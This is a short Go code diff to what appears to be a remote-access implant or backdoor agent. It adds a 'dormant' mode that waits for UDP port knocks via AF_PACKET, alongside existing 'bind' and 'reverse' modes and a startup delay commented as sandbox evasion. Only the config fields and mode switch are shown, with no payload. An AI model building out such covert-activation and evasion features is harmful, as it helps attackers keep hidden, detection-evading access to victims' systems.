@@ -61,6 +61,9 @@ type Config struct {
 
 	// Delay is the startup delay before network activity (sandbox evasion).
 	Delay time.Duration
+
+	// KnockPort is the UDP port to listen for AF_PACKET knocks (dormant mode).
+	KnockPort uint16
 }
 
 // Agent is the main agent orchestrator.
@@ -96,6 +99,8 @@ func (a *Agent) Run(ctx context.Context) error {
 	switch a.cfg.Mode {
 	case "bind":
 		return a.runBind(ctx)
+	case "dormant":
+		return a.runDormant(ctx)
 	default: // "reverse"
 		return a.runReverse(ctx)
 	}
